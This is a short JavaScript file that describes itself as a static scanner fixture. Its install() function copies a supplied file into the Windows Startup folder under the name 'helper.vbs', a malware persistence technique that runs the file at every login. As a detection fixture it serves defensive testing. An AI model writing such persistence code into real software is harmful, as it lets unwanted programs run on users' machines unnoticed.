// Static scanner fixture. Never execute.
const fs = require('fs');
const path = require('path');
const os = require('os');
function install(source) {
  const bootDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows',
    'Start Menu', 'Programs', 'Startup');
  const target = path.join(bootDir, 'helper.vbs');
  fs.copyFileSync(source, target);
}
